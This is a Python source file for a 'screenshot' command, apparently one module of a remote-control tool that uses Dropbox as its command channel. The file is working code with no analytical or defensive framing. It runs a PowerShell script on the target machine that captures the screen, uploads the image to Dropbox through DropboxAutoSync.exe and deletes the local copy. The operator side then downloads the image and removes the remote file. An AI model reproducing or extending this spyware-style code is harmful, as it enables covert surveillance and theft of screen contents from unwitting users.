"""
Command screenshot
"""


from command.command import CommandBase
from logger.logger import Logger


class CommandScreenShot(CommandBase):
    _ScreenshotRemoteFileName = "scr.png"

    def __init__(self):
        self._arguments = {}
        self._engine = None
        self._drive_client = None
        self._logger = None

    def get_name(self):
        return "screenshot"

    def get_arguments_names(self):
        return {"path": "path to save"}

    def set_arguments(self, arguments):
        self._arguments = arguments

    def run(self, engine, client, logger):
        self._engine = engine
        self._drive_client = client
        self._logger = logger
        script = "[Reflection.Assembly]::LoadWithPartialName('System.Drawing');"\
                 "$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080);"\
                 "$path = 'scr.png';"\
                 "$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;"\
                 "$graphics = [Drawing.Graphics]::FromImage($bmp);"\
                 "$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);"\
                 "$bmp.Save($path);"\
                 "$graphics.Dispose();"\
                 "$bmp.Dispose();"\
                 f".\DropboxAutoSync.exe put {self._ScreenshotRemoteFileName} " \
                 f"{engine.get_path_prefix()}/{self._ScreenshotRemoteFileName};"\
                 f"Remove-Item {self._ScreenshotRemoteFileName};"
        engine.run_script(script)
        return True

    def stop(self):
        pass
        "Nothing to do"

    def process_output(self, output):
        return output

    def drive_changed(self):
        path_prefix = self._engine.get_path_prefix()
        file_list = self._drive_client.list_dir(path_prefix)
        if self._ScreenshotRemoteFileName in file_list:
            remote_path = path_prefix + "/" + self._ScreenshotRemoteFileName
            local_path = self._arguments.get("path")
            if not local_path:
                local_path = self._arguments.get(0)
            if not local_path:
                local_path = "screenshot.png"
            self._drive_client.download_file(remote_path, local_path)
            self._drive_client.remove(remote_path)